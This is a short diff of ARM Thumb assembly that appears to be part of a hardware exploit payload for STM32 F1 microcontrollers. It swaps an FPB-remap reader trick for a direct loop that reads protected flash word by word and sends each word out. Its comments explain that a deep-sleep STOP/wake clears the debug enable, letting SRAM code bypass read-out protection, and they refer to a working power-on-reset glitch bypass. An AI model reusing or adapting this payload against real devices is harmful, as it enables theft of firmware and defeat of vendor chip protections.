@@ -404,15 +404,15 @@ stage2_start:
     ldr r0, =0xE000ED08
     str r6, [r0]
 
-    /* Dump flash via FPB reader function at 0x08000101 (thumb)
-     * FPB remaps instruction fetch from 0x08000100 to SRAM reader
-     * PC appears in flash range → flash controller allows data reads */
+    /* Dump flash by DIRECT read from SRAM-executing code.
+     * On F1 (Cortex-M3) once the debug domain is disconnected (deep-sleep
+     * STOP/wake cleared C_DEBUGEN) the flash controller permits data reads
+     * from SRAM code, exactly like the working POR-glitch BYPASS payload.
+     * No FPB "reader" trick needed here (that is an F2/F4-only requirement,
+     * and blx into flash range hardfaults on F1). */
     ldr r5, =0x08000000      /* Flash address to read */
-    ldr r6, =0x08000101      /* FPB reader function (thumb) */
 dump_loop:
-    mov r0, r5                /* Address to read */
-    blx r6                    /* Call reader: r0 = *(uint32_t*)r0 */
-    mov r3, r0                /* Result to r3 for send_word */
+    ldr r3, [r5]              /* direct 32-bit flash read */
     bl send_word
     adds r5, #4
     b dump_loop
